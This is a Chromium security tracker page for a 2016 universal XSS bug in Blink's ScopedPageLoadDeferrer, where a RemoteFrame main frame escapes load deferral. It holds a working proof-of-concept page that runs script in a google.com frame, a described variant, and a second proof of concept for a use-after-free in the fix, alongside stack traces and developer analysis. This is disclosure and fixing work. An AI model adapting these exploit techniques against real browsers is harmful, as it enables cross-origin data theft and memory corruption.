# Security: Universal XSS with ScopedPageLoadDeferrer and RemoteFrame

| Field | Value |
|-------|-------|
| **Issue ID** | [40084865](https://issues.chromium.org/issues/40084865) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>SecurityFeature, Internals>Sandbox>SiteIsolation |
| **Reporter** | se...@gmail.com |
| **Assignee** | al...@chromium.org |
| **Created** | 2016-07-17 |
| **Bounty** | $17,500.00 |

## Description

**VULNERABILITY DETAILS**  

src/third\_party/WebKit/Source/core/page/ScopedPageLoadDeferrer.cpp:33:  

ScopedPageLoadDeferrer::ScopedPageLoadDeferrer(Page\* exclusion)  

{  

for (const Page\* page : Page::ordinaryPages()) {  

if (page == exclusion || page->defersLoading())  

continue;

```
    if (!page->mainFrame()->isLocalFrame())  
        continue;  

    m_deferredFrames.append(page->deprecatedLocalMainFrame());  

    // Ensure that we notify the client if the initial empty document is accessed before  
    // showing anything modal, to prevent spoofs while the modal window or sheet is visible.  
    page->deprecatedLocalMainFrame()->loader().notifyIfInitialDocumentAccessed();  
}  

setDefersLoading(true);  
Platform::current()->currentThread()->scheduler()->suspendTimerQueue();  

```

}

|ScopedPageLoadDeferrer|'s constructor skips a page if its main frame is a |RemoteFrame|. Later, an attacker can load a URL  

which will force the page to replace the main frame with a LocalFrame, while the deferrer is still active. This makes it  

possible to attach a cross-origin content frame to an |iframe| element at an arbitrary JavaScript execution point.

**VERSION**  

Google Chrome 51.0.2704.106 (Official Build) m (64-bit)  

Google Chrome 54.0.2799.0 (Official Build) canary (64-bit)

**REPRODUCTION CASE**

<body>
<h1>Click anywhere on the screen to start</h1>
<script>
if (location.protocol == "file:") {
alert("This page needs to be served over HTTP");
throw 1;
}

runAsync = func => chrome.runtime.sendMessage("a", "", {}, func);  

waitForWindow = (window, accessible, func) => {  

var doc;  

try { doc = window.document } catch (e) { }  

accessible == !!doc ? func() : runAsync(waitForWindow.bind(null, window, accessible, func));  

}

if (location.search != "?popup") {  

document.onclick = () => open(location + "?popup");  

} else {  

opener.name = "remoteWindow";  

remoteWindow = open("<https://www.google.com/>", "remoteWindow");

```
waitForWindow(remoteWindow, false, () => {  
    frame = document.body.appendChild(document.createElement("iframe"));  
    frame.srcdoc = "**<p><iframe src='javascript:top.frameLoaded(frameElement)'></iframe><iframe></iframe>** </p>"  

    frameLoaded = childFrame => {  
        if (targetFrame = childFrame.nextSibling) {  
            runAsync(() => {  
                remoteWindow.location = "about:blank";  
                  
                waitForWindow(remoteWindow, true, () => {  
                    remoteWindow.document.body.appendChild(targetFrame);  
                    targetFrame.src = "https://www.google.com/services/";  
                    waitForWindow(targetFrame.contentWindow, false, () => {  
                        targetFrame.src = "javascript:alert(document.documentElement.innerHTML)";  
                        close();  
                    });  
                });  
            });  
            print();  
        }  
    }  
});  

```

};  

</script>

</body>

|print()| is used to enter a nested event loop. |chrome.runtime.sendMessage()| is used to run JavaScript inside the nested loop.

--

I would like to remain anonymous for this report.

## Attachments

- [repro_2.html](attachments/repro_2.html) (text/plain, 2.5 KB)

## Timeline

### ta...@google.com (2016-07-18)

Thank you!
jww, mkwst, or jochen, could you take a look at this issue?

### mk...@chromium.org (2016-07-18)

I can reproduce locally on dev (53.0.2783.5). Joel is OOO, but perhaps alexmos, nasko, or creis can take a look at the RemoteFrame implications during today PDT? If no resolution is forthcoming, Jochen or I can poke at it in the morning CEST.

### ta...@google.com (2016-07-18)

[Empty comment from Monorail migration]

[Monorail components: Blink>SecurityFeature]

### al...@chromium.org (2016-07-18)

+dcheng and +japhet.  Daniel is in JST and so might be able to look at it sooner than the CEST folks.

I poked at this a bit.  The repro page opens a popup, from which we navigate the opener to a google.com URL.  That ensures that even outside all OOPIF modes, the opener tab gets placed in a new process and triggers all OOPIF machinery, since default search provider sites are special and force a process swap.  (This came up before, for example in https://crbug.com/chromium/576204.)

Then, the repro's popup tab navigates the opener tab back to its own process ("about:blank") while having a print dialog open.  ScopedLoadPageDeferrer doesn't defer that load as it should, because when it's constructed, it skips the first Page since it has a remote main frame.  Then, we go through a remote-to-local load (via createProvisional, etc.) in that first Page.

I haven't looked at what happens next, but it seems ScopedLoadPageDeferrer ought to flip the Page::m_defersLoading bit for all Pages, including those with a remote main frame.  The fix for this shouldn't be too bad: I wonder if we can just change the m_deferredFrames tracking in ScopedPageLoadDeferrer to track Pages instead of LocalFrames.


[Monorail components: Internals>Sandbox>SiteIsolation]

### al...@chromium.org (2016-07-19)

FWIW, a strawman ScopedPageLoadDeferrer fix from #4 is at https://codereview.chromium.org/2155393002/, in case anyone wants to poke at it.  I verified that it does stop the repro.

### jo...@chromium.org (2016-07-19)

congrats, you own this issue now :)

### jo...@chromium.org (2016-07-19)

[Empty comment from Monorail migration]

### jo...@chromium.org (2016-07-19)

[Empty comment from Monorail migration]

### mm...@google.com (2016-07-19)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-07-19)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-07-19)

[Empty comment from Monorail migration]

### jo...@chromium.org (2016-07-20)

Please don't mark this fixed even after the patch from #5 was landed, before we understand exactly what's going on here.

My gut feeling is that even if we manage to navigate a page that was supposed to be deferred, we shouldn't be able to run script in it

### jo...@chromium.org (2016-07-20)

the repro crashes when running with DCHECKs btw:

[139201:139201:0720/091921:FATAL:render_frame_host_manager.cc(2467)] Check failed: opener_routing_id != MSG_ROUTING_NONE (-2 vs. -2)
#0 0x7f774e7bb9b1 __interceptor_backtrace
#1 0x7f774ccb2373 base::debug::StackTrace::StackTrace()
#2 0x7f774cd2078c logging::LogMessage::~LogMessage()
#3 0x7f774455cfa8 content::RenderFrameHostManager::CreateOpenerProxies()
#4 0x7f774456af1d content::RenderFrameHostManager::CreatePendingRenderFrameHost()
#5 0x7f774455bc10 content::RenderFrameHostManager::UpdateStateForNavigate()
#6 0x7f774455a60d content::RenderFrameHostManager::Navigate()
#7 0x7f774450560c content::NavigatorImpl::NavigateToEntry()
#8 0x7f77445070e0 content::NavigatorImpl::NavigateToPendingEntry()
#9 0x7f77444dcd85 content::NavigationControllerImpl::NavigateToPendingEntryInternal()
#10 0x7f77444cd09c content::NavigationControllerImpl::NavigateToPendingEntry()
#11 0x7f77444d160b content::NavigationControllerImpl::LoadURLWithParams()
#12 0x7f77521be872 (anonymous namespace)::LoadURLInContents()
#13 0x7f77521bcfea chrome::Navigate()
#14 0x7f7752195623 Browser::OpenURLFromTab()
#15 0x7f7744e834e3 content::WebContentsImpl::RequestOpenURL()
#16 0x7f7744509c49 content::NavigatorImpl::RequestOpenURL()
#17 0x7f7744534d7a content::RenderFrameHostImpl::OpenURL()
#18 0x7f774451d912 content::RenderFrameHostImpl::OnOpenURL()
#19 0x7f774451d431 _ZN3IPC8MessageTI25FrameHostMsg_OpenURL_MetaNSt3__15tupleIJ27FrameHostMsg_OpenURL_ParamsEEEvE8DispatchIN7content19RenderFrameHostImplES9_vMS9_FvRKS4_EEEbPKNS_7MessageEPT_PT0_PT1_T2_
#20 0x7f774451750b content::RenderFrameHostImpl::OnMessageReceived()
#21 0x7f7744ac4542 content::RenderProcessHostImpl::OnMessageReceived()
#22 0x7f7741f6ee98 IPC::ChannelProxy::Context::OnDispatchMessage()
#23 0x7f774ccb5a22 base::debug::TaskAnnotator::RunTask()
#24 0x7f774cd401b6 base::MessageLoop::RunTask()
#25 0x7f774cd40d66 base::MessageLoop::DeferOrRunPendingTask()
#26 0x7f774cd41c1d base::MessageLoop::DoWork()
#27 0x7f774cd4ab57 base::(anonymous namespace)::WorkSourceDispatch()
#28 0x7f7738345e04 g_main_context_dispatch
#29 0x7f7738346048 <unknown>
#30 0x7f77383460ec g_main_context_iteration
#31 0x7f774cd49f65 base::MessagePumpGlib::Run()
#32 0x7f774cd3f3b8 base::MessageLoop::RunHandler()
#33 0x7f774cdd31b6 base::RunLoop::Run()
#34 0x7f7750b56b1e ChromeBrowserMainParts::MainMessageLoopRun()
#35 0x7f77441ef43c content::BrowserMainLoop::RunMainMessageLoopParts()
#36 0x7f77441f89d3 content::BrowserMainRunnerImpl::Run()
#37 0x7f77441e3981 content::BrowserMain()
#38 0x7f77463d6bc0 content::RunNamedProcessTypeMain()
#39 0x7f77463d8823 content::ContentMainRunnerImpl::Run()
#40 0x7f77463d47ab content::ContentMain()
#41 0x7f774e842f29 ChromeMain
#42 0x7f7733016f45 __libc_start_main
#43 0x7f774e777ee5 <unknown>

[1:1:0100/000000:ERROR:broker_posix.cc(41)] Invalid node channel message


### jo...@chromium.org (2016-07-20)

at this point:

#3 0x7fa5ad03228e blink::HTMLFrameElementBase::isURLAllowed()
#4 0x7fa5ad032375 blink::HTMLFrameElementBase::openURL()
#5 0x7fa5ad03467d blink::HTMLFrameElementBase::didNotifySubtreeInsertionsToDocument()
#6 0x7fa5acbce8d3 blink::ContainerNode::notifyNodeInserted()
#7 0x7fa5acbc9f66 blink::ContainerNode::parserAppendChild()
#8 0x7fa5ad2664ad blink::HTMLConstructionSite::executeQueuedTasks()
#9 0x7fa5ad27a16f blink::HTMLDocumentParser::processParsedChunkFromBackgroundParser()

the ScriptController::canAccessFromCurrentOrigin() call is disabled, because we're not in a v8 context, and so there is no current origin.

### dc...@chromium.org (2016-07-20)

The DCHECK is being tracked in https://crbug.com/chromium/629651

### jo...@chromium.org (2016-07-20)

interestingly, there are two attempts to navigate the frame to javscript:alert... the first one is synchronously from v8 and looks legit - the access check here disallows the navigation:

#0 0x7f3a9b8371f1 __interceptor_backtrace
#1 0x7f3a9a0d7743 base::debug::StackTrace::StackTrace()
#2 0x7f3a7e829c2a blink::HTMLFrameElementBase::isURLAllowed()
#3 0x7f3a7e829fe5 blink::HTMLFrameElementBase::openURL()
#4 0x7f3a7e82b9b8 blink::HTMLFrameElementBase::setLocation()
#5 0x7f3a7e82aa0b blink::HTMLFrameElementBase::parseAttribute()
#6 0x7f3a7e4cbd7d blink::Element::attributeChanged()
#7 0x7f3a7e4ebe4b blink::Element::didModifyAttribute()
#8 0x7f3a7e4bc874 blink::Element::setAttribute()
#9 0x7f3a7dd6b73f blink::HTMLIFrameElementV8Internal::srcAttributeSetterCallback()
#10 0x7f3a8e010bda v8::internal::FunctionCallbackArguments::Call()
#11 0x7f3a8e191975 v8::internal::(anonymous namespace)::HandleApiCallHelper<>()
#12 0x7f3a8e190a5c v8::internal::Builtins::InvokeApiFunction()
#13 0x7f3a8ece7c00 v8::internal::Object::SetPropertyWithAccessor()
#14 0x7f3a8ed1e8c8 v8::internal::Object::SetPropertyInternal()
#15 0x7f3a8ed1d9ae v8::internal::Object::SetProperty()
#16 0x7f3a8eb7a348 v8::internal::StoreIC::Store()
#17 0x7f3a8eb8d364 v8::internal::Runtime_StoreIC_Miss()
#18 0x7f3a507063a7 <unknown>

the second one is as in #14 from the background parser:

#0 0x7f3a9b8371f1 __interceptor_backtrace
#1 0x7f3a9a0d7743 base::debug::StackTrace::StackTrace()
#2 0x7f3a7e829c2a blink::HTMLFrameElementBase::isURLAllowed()
#3 0x7f3a7e829fe5 blink::HTMLFrameElementBase::openURL()
#4 0x7f3a7e82c2ed blink::HTMLFrameElementBase::didNotifySubtreeInsertionsToDocument()
#5 0x7f3a7e3c67b3 blink::ContainerNode::notifyNodeInserted()
#6 0x7f3a7e3c1e46 blink::ContainerNode::parserAppendChild()
#7 0x7f3a7ea5e11d blink::HTMLConstructionSite::executeQueuedTasks()
#8 0x7f3a7ea71ddf blink::HTMLDocumentParser::processParsedChunkFromBackgroundParser()
#9 0x7f3a7ea6cfeb blink::HTMLDocumentParser::pumpPendingSpeculations()
#10 0x7f3a7ea9fc4f _ZN4base8internal7InvokerINS0_9BindStateIMN5blink19HTMLParserSchedulerEFvvEJNS3_14WeakPersistentIS4_EEEEEFvvEE3RunEPNS0_13BindStateBaseE
#11 0x7f3a836ce7fe _ZN4base8internal7InvokerINS0_9BindStateIPFvNSt3__110unique_ptrIN5blink13WebTaskRunner4TaskENS3_14default_deleteIS7_EEEEEJNS0_13PassedWrapperISA_EEEEEFvvEE3RunEPNS0_13BindStateBaseE
#12 0x7f3a9a0db365 base::debug::TaskAnnotator::RunTask()
#13 0x7f3a836b382c scheduler::TaskQueueManager::ProcessTaskFromWorkQueue()
#14 0x7f3a836b060e scheduler::TaskQueueManager::DoWork()
#15 0x7f3a836b55ac _ZN4base8internal7InvokerINS0_9BindStateIMN9scheduler16TaskQueueManagerEFvNS_9TimeTicksEbEJNS_7WeakPtrIS4_EES5_bEEEFvvEE3RunEPNS0_13BindStateBaseE
#16 0x7f3a9a0db365 base::debug::TaskAnnotator::RunTask()
#17 0x7f3a9a1487cd base::MessageLoop::RunTask()
#18 0x7f3a9a1493c6 base::MessageLoop::DeferOrRunPendingTask()
#19 0x7f3a9a14a30d base::MessageLoop::DoWork()
#20 0x7f3a9a14f301 base::MessagePumpDefault::Run()
#21 0x7f3a9a1be3d9 base::RunLoop::Run()
#22 0x7f3a94276e98 content::RendererMain()
#23 0x7f3a9465a976 content::RunZygote()
#24 0x7f3a9465d72e content::ContentMainRunnerImpl::Run()
#25 0x7f3a94659c1b content::ContentMain()
#26 0x7f3a9b8be769 ChromeMain
#27 0x7f3a83965f45 __libc_start_main
#28 0x7f3a9b7f3725 <unknown>
#0 0x7f3a9b8371f1 __interceptor_backtrace
#1 0x7f3a9a0d7743 base::debug::StackTrace::StackTrace()
#2 0x7f3a7e829c2a blink::HTMLFrameElementBase::isURLAllowed()
#3 0x7f3a7e83d152 blink::HTMLIFrameElement::layoutObjectIsNeeded()
#4 0x7f3a7e546ea5 blink::LayoutTreeBuilderForElement::shouldCreateLayoutObject()
#5 0x7f3a7e4d2f2a blink::Element::attach()
#6 0x7f3a7e82c383 blink::HTMLFrameElementBase::attach()
#7 0x7f3a7e57ec4f blink::Node::reattach()
#8 0x7f3a7e4d6e57 blink::Element::recalcOwnStyle()
#9 0x7f3a7e4d629d blink::Element::recalcStyle()
#10 0x7f3a7e3d0c9d blink::ContainerNode::recalcChildStyle()
#11 0x7f3a7e4d667d blink::Element::recalcStyle()
#12 0x7f3a7e3d0c9d blink::ContainerNode::recalcChildStyle()
#13 0x7f3a7e4d667d blink::Element::recalcStyle()
#14 0x7f3a7e43f153 blink::Document::updateStyle()
#15 0x7f3a7e43322d blink::Document::updateStyleAndLayoutTree()
#16 0x7f3a7f1c0da5 blink::FrameSelection::focusedOrActiveStateChanged()
#17 0x7f3a94221c42 _ZN3IPC8MessageTI22ViewMsg_SetActive_MetaNSt3__15tupleIJbEEEvE8DispatchIN7content14RenderViewImplES8_vMS8_FvbEEEbPKNS_7MessageEPT_PT0_PT1_T2_
#18 0x7f3a9420db77 content::RenderViewImpl::OnMessageReceived()
#19 0x7f3a90c7e1ca IPC::MessageRouter::RouteMessage()
#20 0x7f3a90c7dffd IPC::MessageRouter::OnMessageReceived()
#21 0x7f3a91fefd0e content::ChildThreadImpl::OnMessageReceived()
#22 0x7f3a90c46078 IPC::ChannelProxy::Context::OnDispatchMessage()
#23 0x7f3a9a0db365 base::debug::TaskAnnotator::RunTask()
#24 0x7f3a836b382c scheduler::TaskQueueManager::ProcessTaskFromWorkQueue()
#25 0x7f3a836b060e scheduler::TaskQueueManager::DoWork()
#26 0x7f3a836b55ac _ZN4base8internal7InvokerINS0_9BindStateIMN9scheduler16TaskQueueManagerEFvNS_9TimeTicksEbEJNS_7WeakPtrIS4_EES5_bEEEFvvEE3RunEPNS0_13BindStateBaseE
#27 0x7f3a9a0db365 base::debug::TaskAnnotator::RunTask()
#28 0x7f3a9a1487cd base::MessageLoop::RunTask()
#29 0x7f3a9a1493c6 base::MessageLoop::DeferOrRunPendingTask()
#30 0x7f3a9a14a30d base::MessageLoop::DoWork()
#31 0x7f3a9a14f301 base::MessagePumpDefault::Run()
#32 0x7f3a9a1be3d9 base::RunLoop::Run()
#33 0x7f3a94276e98 content::RendererMain()
#34 0x7f3a9465a976 content::RunZygote()
#35 0x7f3a9465d72e content::ContentMainRunnerImpl::Run()
#36 0x7f3a94659c1b content::ContentMain()
#37 0x7f3a9b8be769 ChromeMain
#38 0x7f3a83965f45 __libc_start_main
#39 0x7f3a9b7f3725 <unknown>

it is also noteworthy that it goes down to ChromeMain without print() or anything on the stack, so it means that it happens after the close() - which I guess cancels print()

### se...@gmail.com (2016-07-20)

FWIW, inserting an "iframe" element with the "src" attribute set to a "javascript:" uri and an existing content frame
when there are no active v8 contexts on the stack has been used in UXSSes quite a few times, I believe the first one was
in https://crbug.com/chromium/117226.
Maybe it is worth adding |RELEASE_ASSERT(!contentFrame())| into |HTMLFrameElementBase::didNotifySubtreeInsertionsToDocument()|?

### dc...@chromium.org (2016-07-20)

[Empty comment from Monorail migration]

### al...@chromium.org (2016-07-20)

Not sure why there's no bugdroid comment yet, but the fix from #5 has landed as r406632.

### al...@chromium.org (2016-07-20)

[Empty comment from Monorail migration]

### al...@chromium.org (2016-07-21)

To follow up on #16, a couple of other observations:

- there seem to be multiple calls made to frameLoaded(), due to the way srcdoc is set up.  Note the mismatched nesting in closing <b> and <p> tags.  Somehow, this appears to cause frameLoaded to be called three times.  First, when the second iframe in the srcdoc isn't defined (childFrame.nextSibling is null), and the next two when it is.  The second one is where the attack occurs.  I don't know enough about the parser to understand why this happens.

- the successful alert execution is triggered as part of close().  Easily verified if you comment out the close() call.  The alert won't happen until you close the print dialog yourself.  This is when the second isURLAllowed check in #16 incorrectly returns true.

- the second HTMLFrameElementBase::isURLAllowed on the alert returns true because indeed there's no v8 context: inside the protocolIsJavaScript if, ScriptController::canAccessFromCurrentOrigin returns true, because isolate->InContext() is false.  It looks like this is happening as part of notifyNodeInserted for the <p> element from the parser, which is calling didNotifySubtreeInsertionsToDocument on both <iframes>, which is causing them to call openURL again.  I don't know this code - perhaps this happens to finish up parsing of the srcdoc which was suspended when we called print() (and the targetFrame has since been moved to another document/tab during print())?


### dc...@chromium.org (2016-07-21)

[Empty comment from Monorail migration]

### dc...@chromium.org (2016-07-21)

alexmos@: frameLoaded is only called twice: the third call to canAccessFromCurrentOrigin() actually happens in layout and doesn't evaluate the JS URL. I thought it was happening three times as well, until we looked at the stack traces more closely.


dominicc@, kouhei@, and I spent some time looking at this today to understand how the parser gets confused.

- We might not be able to reproduce on M51? We'll double check this, since the original report indicates it works there. If it did break at some point, that would be interesting to know.
- When the parser sees the mismatched tags, it ends up reparenting the iframe elements into <b>: this is why we see the frameLoaded callback get invoked twice.
- Later on, the parser gets into a confused state because it's apparently getting detached when it assumes it shouldn't happen? HTMLConstructionSite.cpp:312 assumes that we don't detach in between executeTask() calls, but apparently we're ending up in the state.

One proposed fix is to have the parser check if it's detached after executeTask().

### sh...@chromium.org (2016-07-21)

[Empty comment from Monorail migration]

### al...@chromium.org (2016-07-21)

#23: hmm, if I put a console.log() inside frameLoaded, I see three messages (third time happens after the alert though.)

Here's a simple snippet that I tried on a blank page:

foo = function() { console.log("foo"); }  

document.body.appendChild(document.createElement("iframe")).srcdoc="**<p><iframe src='javascript:top.foo()'></iframe>** </p>"

This produces three "foo" messages for me (I tried 51.0.2704.103 and 54.0.2800.0).

In the repro, it seems that the third frameLoaded has blink::executeReparentTask on the stack, and the second one where the attack happens doesn't.

### se...@gmail.com (2016-07-24)

The original repro case no longer works on Canary, however, it is possible to make it work again with minor modifications.
Consider the following scenario:
1. The repro in the first tab opens a new tab with a URL that forces a process swap (for example, the default search provider).
2. The repro navigates the cross-process tab to an attacker-controlled page. Note that two tabs should remain cross-process when
the navigation is complete.
3. The first tab enters a nested message loop.
4. The second tab creates one more tab. The first tab's process receives a |ViewMsg_New| IPC message and creates a new |Page|
with |m_defersLoading| set to false.
5. The repro forces the third tab to use the first tab's process.
Now we have a local frame inside a page that does not defer loading. The rest is as in the original repro.

Note the repro should be accessible through two different host names or ports in order for step 2 to work. Also, I had trouble
reproducing this using python's SimpleHTTPServer because it did not handle simultaneous requests.

### al...@chromium.org (2016-07-25)

I'll be OOO until 7/26, so if someone from site isolation wants to look at #26 sooner, please feel free.  Otherwise I'll take a look Tuesday.  FWIW, it sounds totally plausible - we probably shouldn't be creating a new Page that doesn't defer loading while inside ScopedPageLoadDeferrer, but nothing stops cross-process openers or OOPIFs from doing so via window.open.

### dc...@chromium.org (2016-07-25)

Sigh, we can make Page consult ScopedPageLoadDeferrer when it's constructed but at this point, it feels like we're playing whack-a-mole...

### dc...@chromium.org (2016-07-25)

I've prepared https://codereview.chromium.org/2174263002/ to address this. It's pretty ugly, since we're papering over the fact that the embedder can trivially violate the assumptions that script will be blocked in alert() / print(), etc.

Another crazy idea: how about we just throw a ScriptForbiddenScope on the stack when ScopedPageLoadDeferrer is active?

### bu...@chromium.org (2016-07-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/19ad54cb204cde45db95e773c5d54b04b2f178d4

commit 19ad54cb204cde45db95e773c5d54b04b2f178d4
Author: dcheng <dcheng@chromium.org>
Date: Thu Jul 28 07:34:01 2016

Defer loads in new pages/frames if ScopedPageLoadDeferral is active

BUG=628942

Review-Url: https://codereview.chromium.org/2174263002
Cr-Commit-Position: refs/heads/master@{#408354}

[modify] https://crrev.com/19ad54cb204cde45db95e773c5d54b04b2f178d4/third_party/WebKit/Source/core/loader/DocumentLoader.cpp
[modify] https://crrev.com/19ad54cb204cde45db95e773c5d54b04b2f178d4/third_party/WebKit/Source/core/loader/FrameLoader.cpp
[modify] https://crrev.com/19ad54cb204cde45db95e773c5d54b04b2f178d4/third_party/WebKit/Source/core/page/Page.cpp
[modify] https://crrev.com/19ad54cb204cde45db95e773c5d54b04b2f178d4/third_party/WebKit/Source/core/page/ScopedPageLoadDeferrer.cpp
[modify] https://crrev.com/19ad54cb204cde45db95e773c5d54b04b2f178d4/third_party/WebKit/Source/core/page/ScopedPageLoadDeferrer.h
[modify] https://crrev.com/19ad54cb204cde45db95e773c5d54b04b2f178d4/third_party/WebKit/Source/web/tests/WebViewTest.cpp


### se...@gmail.com (2016-07-29)

@dcheng, it looks like the fix in https://codereview.chromium.org/2174263002 introduced a use-after-free bug.

src/third_party/WebKit/Source/core/page/ScopedPageLoadDeferrer.cpp:38:
void setDefersLoading(bool isDeferred)
{
    for (const auto& page : Page::ordinaryPages())
        page->setDefersLoading(isDeferred);
}

The iterator does not support modification of its collection inside the loop, however, |FrameLoader::setDefersLoading()|
may call |load()|, which in turn may call a JS event handler.

Repro:
<body>
<h1>Click anywhere twice</h1>
<script>
WINDOW_COUNT = 2;

runAsync = func => chrome.runtime.sendMessage("a", "", {}, func);

windowArray = [];
document.onclick = () => {
	if (windowArray.length < WINDOW_COUNT) {
		var wnd = open("", "", "width=1,height=1");
		wnd.moveTo(10000, 10000);
		windowArray.push(wnd);

		if (windowArray.length == WINDOW_COUNT) {
			document.onclick = null;

			for (var i = 0; i < 2; ++i) {
				var a = windowArray[0].document.createElement("a");
				a.href = "about:page" + i;
				a.click();
			}

			windowArray[0].history.back();
			windowArray[0].onunload = () => {
				for (var window of windowArray)
					window.close();
			}

			runAsync(() => windowArray[1].close());
			windowArray[1].print();
		}
	}
}
</script>
</body>

==960==ERROR: AddressSanitizer: use-after-poison on address 0x0ebc7e38 at pc 0x84caca93 bp 0xdeadbeef sp 0x00767b70
READ of size 4 at 0x0ebc7e38 thread T0
    #0 0x84caca92 in blink::ScopedPageLoadDeferrer::~ScopedPageLoadDeferrer+0x322 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x14cbca92)
    #1 0x84d08ea4 in blink::ChromeClient::print+0xa4 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x14d18ea4)
    #2 0x84b772ef in blink::LocalDOMWindow::print+0x62f (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x14b872ef)
    #3 0x868f883e in blink::V8ErrorHandler::create+0x5f4e (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1690883e)
    #4 0x8d98fc2f in v8::internal::FunctionCallbackArguments::Call+0x36f (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1d99fc2f)
    #5 0x8c9016fe in v8::internal::Builtins::InvokeApiFunction+0x1dae (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1c9116fe)
    #6 0x8c8fe3b3 in v8::internal::Builtin_HandleApiCall+0x1063 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1c90e3b3)
    #7 0x8c8fd599 in v8::internal::Builtin_HandleApiCall+0x249 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1c90d599)
    #8 0x1620a23d  (<unknown module>)
    #9 0x162608de  (<unknown module>)
    #10 0x1620b6b5  (<unknown module>)
    #11 0x1623cf1d  (<unknown module>)
    #12 0x16226e62  (<unknown module>)
    #13 0x8cb4b50c in v8::internal::Execution::Call+0xf3c (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1cb5b50c)
    #14 0x8cb4ab41 in v8::internal::Execution::Call+0x571 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1cb5ab41)
    #15 0x8259f3f1 in v8::Function::Call+0x781 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x125af3f1)
    #16 0x8633d972 in blink::V8ScriptRunner::callFunction+0x4e2 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1634d972)
    #17 0x8703d17a in blink::V8EventListener::callListenerFunction+0x2da (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1704d17a)
    #18 0x86fe31ec in blink::V8AbstractEventListener::invokeEventHandler+0x34c (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x16ff31ec)
    #19 0x86fe2c06 in blink::V8AbstractEventListener::handleEvent+0x2d6 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x16ff2c06)
    #20 0x86fe2804 in blink::V8AbstractEventListener::handleEvent+0x194 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x16ff2804)
    #21 0x8425ef29 in blink::EventTarget::fireEventListeners+0xee9 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1426ef29)
    #22 0x8425d559 in blink::EventTarget::fireEventListeners+0x2d9 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1426d559)
    #23 0x844219db in blink::EventDispatcher::dispatchEventAtBubbling+0x1ab (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x144319db)
    #24 0x84420de5 in blink::EventDispatcher::dispatch+0x885 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x14430de5)
    #25 0x8442906f in blink::MouseEventDispatchMediator::dispatchEvent+0x22f (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1443906f)
    #26 0x8441eef7 in blink::EventDispatcher::dispatchEvent+0x2c7 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1442eef7)
    #27 0x841ca655 in blink::Node::dispatchEventInternal+0x35 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x141da655)
    #28 0x841cae0f in blink::Node::dispatchMouseEvent+0x5f (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x141dae0f)
    #29 0x842153a0 in blink::EventHandler::handleMouseReleaseEvent+0x1100 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x142253a0)
    #30 0x82c25568 in blink::PageWidgetEventHandler::handleMouseUp+0xc8 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x12c35568)
    #31 0x82b09902 in blink::WebViewImpl::handleMouseUp+0x12 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x12b19902)
    #32 0x82c24a8f in blink::PageWidgetDelegate::handleInputEvent+0x8cf (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x12c34a8f)
[0729/214555:ERROR:main_dll_loader_win.cc(199)] Could not find exported function RelaunchChromeBrowserWithNewCommandLineIfNeeded
    #33 0x82b1447d in blink::WebViewImpl::handleInputEvent+0xd2d (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x12b2447d)
    #34 0x87ab2740 in content::RenderWidgetInputHandler::HandleInputEvent+0x4600 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x17ac2740)
    #35 0x877aa44e in IPC::MessageT<InputMsg_HandleInputEvent_Meta,std::tuple<blink::WebInputEvent const *,ui::LatencyInfo,enum content::InputEventDispatchType>,void>::Dispatch<content::RenderWidget,content::RenderWidget,void,void (__thiscall content::RenderWidget::*)(blink::WebInputEvent const *,ui::LatencyInfo const &,enum content::InputEventDispatchType)>+0x34e (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x177ba44e)
    #36 0x877a8374 in content::RenderWidget::OnMessageReceived+0x634 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x177b8374)
    #37 0x87682976 in content::RenderViewImpl::OnMessageReceived+0x30d6 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x17692976)
    #38 0x8b21e4ae in IPC::MessageRouter::RouteMessage+0x22e (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1b22e4ae)
    #39 0x8b21e215 in IPC::MessageRouter::OnMessageReceived+0x85 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1b22e215)
    #40 0x8747dce0 in content::ChildThreadImpl::OnMessageReceived+0xb40 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1748dce0)
    #41 0x878407d3 in base::internal::Invoker<base::internal::BindState<base::internal::IgnoreResultHelper<bool (__thiscall content::ChildThreadImpl::*)(IPC::Message const &)>,base::internal::UnretainedWrapper<content::RenderThreadImpl> >,void __cdecl(IPC::Message const &)>::Run+0xa3 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x178507d3)
    #42 0x878406f1 in base::CancelableCallback<void __cdecl(IPC::Message const &)>::Forward+0x31 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x178506f1)
